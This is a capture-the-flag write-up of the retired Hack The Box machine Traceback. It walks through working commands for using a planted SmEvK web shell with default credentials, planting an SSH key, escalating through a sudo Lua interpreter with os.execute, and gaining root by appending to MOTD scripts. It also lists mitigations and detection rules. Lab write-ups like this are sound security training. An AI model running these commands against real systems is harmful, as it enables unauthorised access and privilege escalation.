---
machine: Traceback
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, php, webshell, sudo, lua, motd]
---

# Traceback — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

The box exposes only SSH and an Apache server with a defaced landing page. The page source hints at a public web shell collection and carries a signature: `Xh4H`. Probing that collection's usual file names finds `smevk.php`, a SmEvK v3 with **default credentials** that runs commands as `webadmin`. A temporary SSH key turns that into a stable session; `sudo -l` shows `webadmin` may run `luvit` as `sysadmin`, and `luvit` executes Lua with `os.execute`. As `sysadmin`, `/etc/update-motd.d` is group-writable and **root** runs it on every SSH login.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,80 -sCV -oA nmap_svc <IP>
```

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)
|_http-title: Help us
```

- Only two ports: no database or internal service to enumerate.
- The landing page is defaced and presents itself as "hacked".
- The defacer's handle appears in the HTML and points to their web shell repository.

```bash
echo "<IP> traceback.htb" | sudo tee -a /etc/hosts
```

## Enumeration

A normal directory sweep finds nothing: `server-status` is blocked and there are no backups or panels. The clue is in the HTML comment, so specific file names beat more fuzzing:

```bash
for p in smevk.php shell.php cmd.php backdoor.php; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $p\n" "http://<IP>/$p"
done
```

`/smevk.php` returns 200 and serves the **SmEvK v3** login. The script ships credentials hardcoded (`admin` / `admin`), as usual in that collection.

Once authenticated, the console sends commands by `POST` with `a=Console` and the command in `p1`:

```bash
curl -s -b smevk.cookies -c smevk.cookies \
  --data-urlencode 'a=Console' \
  --data-urlencode 'c=/var/www/html/' \
  --data-urlencode 'p1=id' \
  --data-urlencode 'charset=UTF-8' \
  http://<IP>/smevk.php
```

The response confirms execution as `webadmin`.

## Foothold

The web shell is fine for one-off commands but awkward for the rest of the chain. A personal SSH key is installed through the console itself:

```bash
ssh-keygen -t ed25519 -f traceback_ed25519 -N ''
PUBKEY=$(cat traceback_ed25519.pub)

curl -s -b smevk.cookies \
  --data-urlencode 'a=Console' \
  --data-urlencode 'c=/var/www/html/' \
  --data-urlencode "p1=mkdir -p /home/webadmin/.ssh && echo '$PUBKEY' >> /home/webadmin/.ssh/authorized_keys && chmod 700 /home/webadmin/.ssh && chmod 600 /home/webadmin/.ssh/authorized_keys" \
  --data-urlencode 'charset=UTF-8' \
  http://<IP>/smevk.php

ssh -i traceback_ed25519 webadmin@<IP>
```

Why it works: the web shell already runs as `webadmin`, so it writes to that user's own `authorized_keys` without needing anything else; and the default login had never been changed.

## Lateral movement

There is no second host. The hop is a user hop on the same box:

```bash
sudo -l
```

```text
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

`luvit` is a Lua runtime. Under `sudo` it executes code as `sysadmin`, and Lua has `os.execute`, so the interpreter is the escalation:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("id; ls -la /home/sysadmin")'
```

That reads `user.txt` and opens an interactive shell as `sysadmin`:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash -i")'
```

## Privilege escalation

As `sysadmin`, check the welcome scripts:

```bash
ls -la /etc/update-motd.d/
```

The directory is `root:sysadmin` and the scripts are group-writable. Those scripts are run by **root** on every SSH login, so one line is enough:

```bash
cp /etc/update-motd.d/00-header /tmp/00-header.bak
printf '\ncp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt\n' >> /etc/update-motd.d/00-header
ssh -i traceback_ed25519 webadmin@<IP> true     # fires the MOTD as root
cat /tmp/root.txt
cp /tmp/00-header.bak /etc/update-motd.d/00-header
```

For a shell instead of a file copy, the same line accepts a reverse shell. Restoring the script afterwards keeps the box usable.

## Evidence

- `curl -I` against `smevk.php` returning 200, with no cookies or credentials.
- Trimmed `id` and `sudo -l` output.
- `ls -la /etc/update-motd.d/` showing owner and group permissions.
- No flags, no private key and no `root.txt` contents.

## Lessons learned

- An HTML comment can be the intended path, not decoration: here probing known names beat another wordlist.
- A web shell with default credentials is remote command execution, even when the rest of the site is "only" defaced.
- `sudo` on a general-purpose interpreter (Lua, Python, Perl) means becoming that user, even if the binary is not listed in GTFOBins under that name.
- A MOTD directory writable by a non-root group is root at the next login.
- Restore any system file touched during escalation.

## Mitigations and detection

- Remove the web shell from the document root, or at least change and monitor its authentication.
- Never leave default credentials on internet-facing tooling.
- Do not grant `sudo` to general-purpose interpreters; wrap the task in a script with fixed arguments.
- `/etc/update-motd.d` must be `root:root` with no group write; watch it with AIDE or similar.
- Detection: repeated `POST`s to a `.php` with `a=Console`/`p1=` parameters in the access log, `sudo` to `luvit` in `auth.log` (with TTY and user), and changes under `/etc/update-motd.d` (auditd `-w /etc/update-motd.d -p wa`).

MITRE: T1505.003 (web shell), T1548.003 (sudo and sudo caching), T1037.004 (RC scripts), T1078 (valid accounts).

## References

- <https://www.hackthebox.com/machines/traceback>
- <https://blog.raw.pm/en/HackTheBox-Traceback-write-up>
- <https://blog.wtfender.com/posts/htb-traceback>
- <https://whitehatlab.eu/en/blog/writeup/hackthebox/machine/linux/traceback>
- <https://www.lua.org/manual/5.1/manual.html#pdf-os.execute>
